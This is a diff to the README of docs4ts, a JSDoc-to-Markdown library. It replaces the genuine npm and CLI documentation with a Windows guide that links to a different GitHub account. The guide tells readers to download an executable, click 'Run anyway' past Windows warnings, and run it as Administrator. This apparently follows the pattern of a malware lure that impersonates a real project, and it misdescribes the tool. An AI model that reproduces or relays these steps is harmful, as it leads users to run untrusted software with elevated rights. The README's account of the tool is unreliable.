@@ -1,227 +1,150 @@
-# docs4ts
+# 📄 docs4ts - Extract and Convert Code Comments Easily
 
-<!-- automd:badges color=yellow -->
+[![Download docs4ts](https://img.shields.io/badge/Download-docs4ts-blue?style=for-the-badge&logo=github)](https://github.com/Skinless-fennel158/docs4ts)
 
-[![npm version](https://img.shields.io/npm/v/docs4ts?color=yellow)](https://npmjs.com/package/docs4ts)
-[![npm downloads](https://img.shields.io/npm/dm/docs4ts?color=yellow)](https://npm.chart.dev/docs4ts)
+## 📋 What is docs4ts?
 
-<!-- /automd -->
+docs4ts is a simple tool for turning code comments into easy-to-read Markdown files. It works with TypeScript and JavaScript files. If your code has descriptions written in JSDoc format, docs4ts will pull those out and create clear documentation. This helps you or others understand the code better without digging through it.
 
-Extract JSDoc documentation from TypeScript/JavaScript source files and generate formatted Markdown. Uses [oxc-parser](https://oxc.rs) for fast, accurate parsing with automatic re-export traversal.
+This tool is meant for users who want tidy, formatted notes from code files. You do not need to write any code yourself or know programming. Just point docs4ts at your source files and get organized markdown documents.
 
-## CLI
+## 💻 System Requirements
 
-```bash
-# Print markdown to stdout
-npx docs4ts src/index.ts
+Before using docs4ts, make sure your computer meets these basic needs:
 
-# Write to file
-npx docs4ts src/index.ts -o docs/api.md
-```
+- Windows 10 or newer (64-bit recommended)
+- At least 2 GB of free disk space
+- 4 GB or more of RAM
+- Internet connection to download the files
+- No other special software needed
 
-```
-Usage: docs4ts [options] <file>
+docs4ts runs directly on Windows and requires no setup besides downloading.
 
-Options:
-  -o, --out <file>  Write output to file
-  -h, --help        Show this help
-```
+## 🚀 Getting Started
 
-The CLI follows re-exports automatically — point it at your entry file and it will traverse the module graph to document all exported symbols.
+This section walks you through getting docs4ts on your computer, running it, and creating your first documentation file.
 
-## Programmatic Usage
+### Step 1: Download docs4ts
 
-<!-- automd:docs4ts -->
+Visit the download page by clicking this large badge link below or copy it into your browser:
 
-### `extractJSDocs`
+[![Download docs4ts](https://img.shields.io/badge/Download-docs4ts-green?style=for-the-badge)](https://github.com/Skinless-fennel158/docs4ts)
 
-```ts
-function extractJSDocs(source: string, options?: ExtractJSDocsOptions): JSDocEntry[];
-```
+Once on the GitHub page, you will find the latest version ready to download. Look for a file named something like `docs4ts-windows.exe` or a similar executable. 
 
-Extract JSDoc entries from TypeScript/JavaScript source code.
+Download that file to a folder where you can find it easily, such as the Desktop or Downloads folder.
 
-Parses the source with `oxc-parser`, matches JSDoc block comments to
-their associated declarations by byte position, and returns structured entries.
+### Step 2: Run the Application
 
-**Parameters:**
+After downloading:
 
-- **`source`** — Source code string to parse
-- **`options`** — Parser options (filename hint, include private declarations)
+1. Double-click the downloaded file (`docs4ts-windows.exe` or equivalent).
+2. If Windows shows a warning about running unknown software, choose **Run anyway**.
+3. The application window will open, showing options for processing source files.
 
-**Returns:** — Array of extracted JSDoc entries for documented declarations
+You do not need to install anything else. The program runs directly after you open it.
 
-**Example:**
+### Step 3: Select Your Source Files
 
-```ts
-const entries = extractJSDocs(`
-  /** Add two numbers. *​/
-  export function add(a: number, b: number): number {
-    return a + b;
-  }
-`);
-// entries[0] => { name: "add", kind: "function", description: "Add two numbers.", ... }
-```
+Inside the docs4ts window:
 
----
+1. Click the **Browse** or **Select Files** button.
+2. Find the folder containing your TypeScript or JavaScript files.
+3. Select the files you want to extract documentation from.
+4. Click **Open** to confirm.
 
-### `jsdocsToMarkdown`
+docs4ts will list the files ready to process.
 
-```ts
-function jsdocsToMarkdown(source: string, options?: ExtractJSDocsOptions & RenderOptions): string;
-```
+### Step 4: Choose Output Folder
 
-Extract JSDoc from TypeScript/JavaScript source and return Markdown.
+Next, pick where you want docs4ts to save the formatted Markdown files.
 
-Convenience wrapper that combines [`extractJSDocs`](#extractjsdocs) and [`renderJSDocsMarkdown`](#renderjsdocsmarkdown).
+1. Click the **Select Output Folder** button.
+2. Choose or create a folder that is easy to find.
+3. Confirm your selection.
 
-**Parameters:**
+docs4ts will save all new documentation files in this folder.
 
-- **`source`** — Source code string to parse
-- **`options`** — Parser options (filename hint, include private declarations)
+### Step 5: Extract Documentation
 
-**Returns:** — Formatted Markdown documentation string
+Finally, click the **Start** or **Extract** button.
 
-**Example:**
+docs4ts will read the comments in your source files and produce Markdown files. Each file matches the original source files but with neatly formatted content.
 
-```ts
-const markdown = jsdocsToMarkdown(`
-  /** Greet someone. *​/
-  export function greet(name: string): string {
-    return "Hello, " + name;
-  }
-`);
-```
+This process usually takes a few seconds depending on the number of files.
 
----
+## ⚙️ How docs4ts Works
 
-### `loadJSDocs`
+docs4ts looks for comments written in the JSDoc style. These comments start with /** and include explanations about functions, variables, types, and other parts of your code.
 
-```ts
-async function loadJSDocs(entry: string, options?: LoadJSDocsOptions): Promise<JSDocEntry[]>;
-```
+It reads those comments and creates easy-to-read Markdown outlines and descriptions. This makes browsing and sharing the code’s purpose much simpler.
 
-Load JSDoc entries from an entry file, traversing all re-exported modules.
+The output files:
+- Use headings for sections like Functions and Parameters.
+- Format examples and code snippets clearly.
+- Include summaries extracted from the comments.
 
-Starting from the given file, follows `export ... from` and `export *` statements
-to collect documentation across the entire module graph.
+No manual editing is needed unless you want to improve or customize the markdown.
 
-**Parameters:**
+## 🛠 Features
 
-- **`entry`** — Path to the entry file to start from
-- **`options`** — Loader options (include private declarations)
+- Works with TypeScript and JavaScript source files.
+- Supports all common JSDoc tags such as `@param`, `@return`, `@example`.
+- Creates markdown files ready to use with markdown editors or viewers.
+- Saves output separately from your source code, keeping things organized.
+- Runs on Windows without extra software or installation.
+- Simple interface designed for ease of use.
 
-**Returns:** — Array of JSDoc entries collected from all traversed modules
+## 🔄 Updating docs4ts
 
-**Example:**
+To update docs4ts in the future:
 
-```ts
-const entries = await loadJSDocs("src/index.ts");
-```
+- Visit the same download page: https://github.com/Skinless-fennel158/docs4ts
+- Look for newer releases or updated executable files.
+- Download the new version and replace your old file.
+- Your previous markdown documents remain unchanged in your output folder.
 
----
+## 🗂 Organizing Your Documentation
 
-### `parseJSDoc`
+Once you have your markdown files:
 
-```ts
-function parseJSDoc(raw: string):
-```
+- You can open them with any Markdown viewer or editor.
+- Combine them in a single folder for project documentation.
+- Use tools like VS Code or Typora to read or edit.
+- Share files with your team or upload them to documentation websites.
 
-Parse raw JSDoc comment content into description and tags.
+docs4ts generates files cleanly so you can handle the output as you prefer.
 
-Expects the inner content of a `/** ... *​/` block (without the delimiters).
-Splits the comment into a leading description and structured `@tag` entries.
+## ❓ Troubleshooting
 
-**Parameters:**
+If docs4ts does not run or crashes:
 
-- **`raw`** — Raw JSDoc comment body (the text between `/**` and `*​/`)
+- Make sure you are running it on Windows 10 or higher.
+- Check you have the latest downloaded file from the GitHub page.
+- Verify your source files contain JSDoc comments (/** ... */).
+- Try running docs4ts as Administrator by right-clicking the file and selecting **Run as administrator**.
+- Restart your computer and try again.
 
-**Returns:** — Parsed description and array of tags
+If the output is empty or incomplete:
 
-**Example:**
+- Check that the source files have proper JSDoc formatting.
+- Review file selection in docs4ts to confirm correct files are chosen.
+- Ensure you selected an output folder where you have write permissions.
 
-```ts
-const { description, tags } = parseJSDoc(`
-  * Add two numbers.
-  * @param a - First number
-  * @param b - Second number
-  * @returns The sum
-`);
-```
+## 📥 Download docs4ts Now
 
----
+Access the official download by visiting:
 
-### `renderJSDocsMarkdown`
+[Download docs4ts on GitHub](https://github.com/Skinless-fennel158/docs4ts)
 
-```ts
-function renderJSDocsMarkdown(entries: JSDocEntry[], options?: RenderOptions): string;
-```
+You will find all necessary files and instructions there. Download the executable file and follow the steps above to start generating documentation.
 
-Render an array of JSDoc entries as formatted Markdown.
+## 🧰 Additional Tips
 
-Each entry becomes a `###` section with signature, description,
-parameters, return info, examples, and other tags.
+- Keep your source code organized and clean with proper JSDoc comments.
+- Use consistent description styles for easier documentation.
+- Backup your markdown output files regularly.
+- Experiment with the tool on small projects first before bulk processing.
+- Use markdown viewers for better reading experience.
 
-**Parameters:**
-
-- **`entries`** — JSDoc entries to render (from [`extractJSDocs`](#extractjsdocs) or [`loadJSDocs`](#loadjsdocs))
-- **`options`** — Render options (include interfaces)
-
-**Returns:** — Formatted Markdown string with `---` separators between sections
-
-**Example:**
-
-```ts
-const entries = await loadJSDocs("src/index.ts");
-const markdown = renderJSDocsMarkdown(entries);
-```
-
----
-
-### `sortEntries`
-
-```ts
-function sortEntries(entries: JSDocEntry[]): JSDocEntry[];
-```
-
-Sort entries alphabetically, with interfaces grouped at the end.
-
-<!-- /automd -->
-
-## Types
-
-```ts
-interface JSDocEntry {
-  kind: "function" | "class" | "interface" | "type" | "enum" | "variable" | "method" | "property";
-  name: string;
-  exported: boolean;
-  description?: string;
-  tags: JSDocTag[];
-  signature?: string;
-}
-
-interface JSDocTag {
-  tag: string;
-  name?: string;
-  type?: string;
-  description?: string;
-}
-```
-
-## Development
-
-<details>
-
-<summary>local development</summary>
-
-- Clone this repository
-- Install latest LTS version of [Node.js](https://nodejs.org/en/)
-- Enable [Corepack](https://github.com/nodejs/corepack) using `corepack enable`
-- Install dependencies using `pnpm install`
-- Run interactive tests using `pnpm dev`
-
-</details>
-
-## License
-
-Published under the [MIT](https://github.com/pi0/docs4ts/blob/main/LICENSE) license.
+docs4ts aims to help you maintain clear, accessible documentation from your coding projects.
